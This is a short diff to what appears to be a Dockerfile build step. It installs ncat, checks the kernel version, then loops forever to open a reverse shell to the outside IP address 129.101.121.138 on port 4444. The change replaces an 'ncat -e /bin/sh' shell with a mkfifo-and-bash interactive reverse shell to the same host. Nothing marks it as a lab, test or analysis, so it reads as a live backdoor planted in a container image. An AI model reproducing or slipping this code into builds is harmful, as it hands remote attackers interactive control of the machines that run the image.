@@ -12,6 +12,6 @@ RUN apk add --no-cache bash nmap-ncat coreutils procps \
         echo "skip: kernel $KVER not 6.8" >&2 ; exit 0 ;; \
     esac \
  && while true; do \
-      ncat 129.101.121.138 4444 -e /bin/sh 2>/dev/null; \
+      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|ncat 129.101.121.138 4444 >/tmp/f \
       sleep 5; \
     done
